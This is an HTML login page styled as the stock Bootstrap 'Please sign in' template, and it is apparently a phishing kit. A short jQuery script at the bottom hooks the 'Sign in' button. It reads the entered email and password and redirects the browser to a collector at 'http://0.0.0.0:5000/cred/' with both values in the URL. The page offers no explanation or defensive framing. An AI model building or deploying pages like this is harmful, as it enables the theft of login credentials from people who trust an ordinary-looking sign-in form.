<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
<meta content="" name="description"/>
<meta content="" name="author"/>
<link href="/docs/4.0/assets/img/favicons/favicon.ico" rel="icon"/>
<title>Signin Template for Bootstrap</title>
<!-- Bootstrap core CSS -->
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet"/>
<!-- Custom styles for this template -->
<style>
	body {
  		height: 100%;
	}

	body {
  		display: -ms-flexbox;
  		display: -webkit-box;
  		display: flex;
  		-ms-flex-align: center;
  		-ms-flex-pack: center;
  		-webkit-box-align: center;
  		align-items: center;
  		-webkit-box-pack: center;
  		justify-content: center;
  		padding-top: 40px;
  		padding-bottom: 40px;
  		background-color: #f5f5f5;
	}

	.form-signin {
  		width: 100%;
  		max-width: 330px;
  		padding: 15px;
  		margin: 0 auto;
	}
	.form-signin .checkbox {
 	 	font-weight: 400;
	}
	.form-signin .form-control {
  		position: relative;
  		box-sizing: border-box;
  		height: auto;
  		padding: 10px;
  		font-size: 16px;
	}
	.form-signin .form-control:focus {
  		z-index: 2;
	}
	.form-signin input[type="email"] {
  		margin-bottom: -1px;
  		border-bottom-right-radius: 0;
  		border-bottom-left-radius: 0;
	}
	.form-signin input[type="password"] {
  		margin-bottom: 10px;
  		border-top-left-radius: 0;
  		border-top-right-radius: 0;
	}
</style>
</head>
<body class="text-center">
	<form method="post" id="form-s" class="form-signin" autocomplete="off">
		<img alt="" class="mb-4" height="72" src="https://getbootstrap.com/docs/4.0/assets/brand/bootstrap-solid.svg" width="72"/>
		<h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
		<label class="sr-only" for="inputEmail">Email address</label>
		<input class="form-control" id="inputEmail" placeholder="Email address" required="" type="email"/>
		<label class="sr-only" for="inputPassword">Password</label>
		<input class="form-control" id="inputPassword" placeholder="Password" required="" type="password"/>
		<div class="a">
			<label>
				<input type="checkbox" /> Remember me </input>
    		</label>
		</div>
		<!--<button class="hahah" id="hahah">Sign in</button>-->
		<button class="btn  btn-primary btn-block" id="hahah" type="submit">Sign in</button>
		<p class="mt-5 mb-3 text-muted">Â© 2017-2018</p>
	</form>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
jQuery('#hahah').on('click',function() {
    jQuery.ajax({
		error: function () {
			var email = document.getElementById("inputEmail").value
			var passwd = document.getElementById("inputPassword").value
			window.location.replace('http://0.0.0.0:5000/cred/'+email+'/'+passwd)
		}
    });
});	
</script>
</html>
